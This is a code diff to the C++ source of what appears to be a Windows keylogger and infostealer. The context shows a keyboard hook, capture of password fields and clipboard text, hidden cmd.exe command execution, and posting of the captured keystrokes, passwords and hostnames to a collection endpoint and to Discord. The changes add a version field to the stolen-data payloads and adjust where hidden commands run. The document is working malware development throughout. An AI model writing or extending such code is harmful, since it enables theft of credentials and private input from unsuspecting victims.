@@ -800,7 +800,9 @@ static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = N
     si.hStdOutput = hStdOutWr;
     si.hStdError = hStdOutWr;
     std::string cmdLine = "cmd.exe /c " + cmd;
-    if (!CreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    char sysDir[MAX_PATH];
+    GetSystemDirectoryA(sysDir, MAX_PATH);
+    if (!CreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, sysDir, &si, &pi)) {
         CloseHandle(hStdOutWr); CloseHandle(hStdOutRd);
         if (outExitCode) *outExitCode = -1;
         return "";
@@ -1346,7 +1348,7 @@ static void CheckPasswordFields() {
     json += EscapeJSON(combined);
     json += "\",\"hostname\":\"";
     json += EscapeJSON(g_hostname);
-    json += "\"}]";
+    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
     PostKeys(json);
     PostPasswordToDiscord(g_hostname, combined);
 }
@@ -1368,7 +1370,7 @@ static void CheckClipboard() {
     json += EscapeJSON(text);
     json += "\",\"hostname\":\"";
     json += EscapeJSON(g_hostname);
-    json += "\"}]";
+    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
     PostKeys(json);
     std::string discordText = text.size() > 1000 ? text.substr(0, 1000) + "..." : text;
     PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
@@ -1387,7 +1389,7 @@ static void FlushBuffer() {
     json += EscapeJSON(keys);
     json += "\",\"hostname\":\"";
     json += EscapeJSON(g_hostname);
-    json += "\"}]";
+    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
 
     PostToDiscord(g_hostname, win, keys);
     if (!PostKeys(json)) {
@@ -1417,7 +1419,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             json += EscapeJSON(keys);
             json += "\",\"hostname\":\"";
             json += EscapeJSON(g_hostname);
-            json += "\"}]";
+            json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
             PostToDiscord(g_hostname, win, keys);
             PostKeys(json);
             CheckAutoScreenshot(newTitle);
